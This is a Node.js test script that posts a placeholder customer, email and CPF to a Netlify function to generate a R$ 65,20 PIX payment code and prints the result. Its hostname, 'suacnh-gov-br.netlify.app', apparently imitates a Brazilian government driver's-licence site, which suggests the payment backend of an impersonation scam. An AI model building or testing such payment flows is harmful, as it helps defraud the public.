/**
 * Teste Gateway PIX - Valor R$ 65,20
 * Chama a função serverless Netlify com valor do frontend
 */

const https = require('https');

function testarGateway(valor, nome) {
  return new Promise((resolve) => {
    const payload = {
      amount: valor,
      nome: nome || 'Cliente Teste',
      email: 'teste@exemplo.com',
      cpf: '11144477735'
    };

    const payloadBuffer = Buffer.from(JSON.stringify(payload));

    const options = {
      hostname: 'suacnh-gov-br.netlify.app',
      port: 443,
      path: '/.netlify/functions/pix', // Chama função diretamente
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': payloadBuffer.length,
      }
    };

    console.log('\n🔄 Gerando PIX com valor: R$ ' + valor.toFixed(2));
    console.log('📊 Cliente: ' + (nome || 'Cliente Teste'));
    console.log('⏳ Processando...\n');

    const req = https.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        try {
          const body = JSON.parse(data);

          if (body.success && body.pixCode) {
            console.log('╔════════════════════════════════════════════════════════════╗');
            console.log('║            ✅ PIX GERADO COM SUCESSO!                      ║');
            console.log('╚════════════════════════════════════════════════════════════╝\n');
            
            console.log('📋 DETALHES DO PAGAMENTO:');
            console.log(`   💰 Valor: R$ ${valor.toFixed(2)}`);
            console.log(`   📝 Status: ${body.status}`);
            console.log(`   🔐 Transaction ID: ${body.transaction_id}`);
            console.log(`   👤 Cliente: ${nome || 'Cliente Teste'}`);
            
            console.log('\n📱 CÓDIGO PIX (copia e cola para pagar):\n');
            console.log(`   ${body.pixCode}\n`);
            
            if (body.qr_code_image) {
              console.log(`📸 QR Code: ${body.qr_code_image}\n`);
            }
            
            console.log('═'.repeat(60) + '\n');
            resolve(body);
          } else if (body.error) {
            console.log('❌ ERRO AO GERAR PIX:');
            console.log(`   ${body.error}`);
            if (body.debug) console.log(`   Debug: ${JSON.stringify(body.debug)}`);
            resolve(body);
          } else {
            console.log('⚠️  Resposta da gateway:');
            console.log(JSON.stringify(body, null, 2));
            resolve(body);
          }
        } catch(e) {
          console.log('❌ ERRO ao processar resposta:', e.message);
          resolve({ error: e.message, resposta: data.substring(0, 200) });
        }
      });
    });

    req.on('error', (e) => {
      console.log('❌ ERRO DE CONEXÃO:', e.message);
      resolve({ error: e.message });
    });

    req.write(payloadBuffer);
    req.end();
  });
}

/**
 * TESTE PRINCIPAL
 */
(async () => {
  console.log('\n╔════════════════════════════════════════════════════════════╗');
  console.log('║         TESTE DE GATEWAY - AVENPAY R$ 65,20               ║');
  console.log('║        Gerando PIX com valor do frontend                 ║');
  console.log('╚════════════════════════════════════════════════════════════╝');

  // Teste com valor 65.20 (valor do frontend)
  const resultado = await testarGateway(65.20, 'João Cliente');

  console.log('╔════════════════════════════════════════════════════════════╗');
  console.log('║           RESPOSTA COMPLETA DA GATEWAY                    ║');
  console.log('╚════════════════════════════════════════════════════════════╝\n');
  console.log(JSON.stringify(resultado, null, 2));

  console.log('\n' + '═'.repeat(60));
  console.log('✅ TESTE FINALIZADO COM SUCESSO!');
  console.log('═'.repeat(60) + '\n');
})();
